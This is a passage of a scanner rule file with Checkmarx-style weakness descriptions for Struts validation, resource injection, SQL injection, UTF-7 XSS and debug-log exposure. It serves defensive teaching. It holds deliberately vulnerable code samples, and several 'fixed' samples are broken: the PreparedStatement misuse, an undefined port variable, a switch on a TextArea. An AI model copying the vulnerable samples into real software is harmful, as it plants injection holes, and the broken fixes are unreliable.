&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_104_Applicable Platforms" id="oc_104_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_104_Common Consequences" id="oc_104_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Bypassing the validation framework for a form exposes the application
to numerous types of attacks. Unchecked input is an important component
of vulnerabilities like cross-site scripting, process control, and SQL
injection.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Although J2EE applications are not generally susceptible to memory
corruption attacks, if a J2EE application interfaces with native code
that does not perform array bounds checking, an attacker may be able to
use an input validation mistake in the J2EE application to launch a
buffer overflow attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_104_Potential Mitigations" id="oc_104_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;All forms must extend one of the Validation Class (See Context
notes).&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_104_Background Details" id="oc_104_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;In order to use the Struts Validator, a form must extend one of the
following: ValidatorForm, ValidatorActionForm, DynaValidatorActionForm, and
DynaValidatorForm. You must extend one of these classes because the Struts
Validator ties in to your application by implementing the validate() method
in these classes. Forms derived from the ActionForm and DynaActionForm
classes cannot use the Struts Validator.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_104_Weakness Ordinalities" id="oc_104_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_104_Relationships" id="oc_104_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;573&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=573" target="_blank"&gt;Failure to Follow Specification&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('104_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_104_Causal Nature" id="oc_104_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_104_Taxonomy Mappings" id="oc_104_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Form Bean Does Not Extend Validation
Class&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_104_Content History" id="oc_104_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Background Details, Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1064</key><name>Potential_Resource_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could open a backdoor enabling the attacker to connect directly to the application server, potentially leading to server takeover or other direct attacks.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application opens a network socket, for listening to incoming network connections. However, the application uses user input to define the socket, enabling an attacker to control it.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Don&amp;#8217;t allow a user to define parameters of network sockets.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application opens a network socket using a port number inputed by the user
      &lt;/h4&gt;&lt;pre&gt;

class ResourceInjection
{
            public void foo(TextBox textBox1)
        {
                        long address = Convert.ToInt32(textBox1.Text);
            IPEndPoint endpoint = new IPEndPoint(address, port);
            Socket socket = new Socket(endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endpoint);
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The application opens a hard-coded port number and does receive it from the user
      &lt;/h4&gt;&lt;pre&gt;

class ResourceInjection
{
            public void foo(TextBox textBox1, long address)
        {
            IPEndPoint endpoint = new IPEndPoint(address, 15551);
            Socket socket = new Socket(endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endpoint);
        }
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application opens a network socket using a port number inputed by the user&lt;/h4&gt;&lt;pre&gt;public class ResourceInjection {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter port number: ");
		int portNumber = Integer.parseInt(userInputScanner.nextLine());
		try {
			ServerSocket serverSocket = new ServerSocket(portNumber);
		} catch (Exception e) {
			System.err.println("Caught Exception: " + e.getMessage());
		}

	}
}&lt;/pre&gt;&lt;h4&gt;The application opens a hard-coded port number according to the user input&lt;/h4&gt;&lt;pre&gt;public class ResourceInjectionFixed {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter port name: ");
		String portName = userInputScanner.nextLine();
		int portNum;
		switch (portName) {
		case "ftps":
			portNum = 989;
			break;
		case "ftp":
			portNum = 20;
			break;
		case "smtp":
			portNum = 25;
			break;
		default:
			portNum = 80;
		}
		try {
			ServerSocket serverSocket = new ServerSocket(portNum);
		} catch (Exception e) {
			System.err.println("Caught Exception: " + e.getMessage());
		}
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application opens a network socket using a host name inputed by the user&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import socket
import sys

userInput = stdin.readline()

HOST = userInput 
PORT = 8888 # Arbitrary non-privileged port
	 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'
	 
#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
print 'Socket bind complete'&lt;/pre&gt;&lt;h4&gt;The application opens a hard-coded host name and does receive it from the user&lt;/h4&gt;&lt;pre&gt;import socket
import sys

HOST = ''   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port
	 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'
	 
#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
print 'Socket bind complete'&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1065</key><name>Potential_SQL_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using simple tools and text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using string obtained from the user
      &lt;/h4&gt;&lt;pre&gt;public class SQLInjection
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {	
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (user)"
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h4&gt;
The string obtained from the user is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;
class SqlInjectionFixed
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (@param1)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                cmd.Parameters.AddWithValue(@param1, user);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using string obtained from the user&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = " + user;
		Statement stmt = con.createStatement();
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;h4&gt;The string obtained from the user is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection_Fixed {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = ?";
		PreparedStatement stmt = con.createStatement(query);
		stmt.setString(1, user);
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1066</key><name>Potential_UTF7_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1645</key><name>Information_Exposure_Through_Debug_Log</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Exposed details about the application&amp;#8217;s environment, users, or associated data (for example, stack trace) could enable an attacker to find another flaw and help the attacker to mount an attack.&lt;/div&gt;      
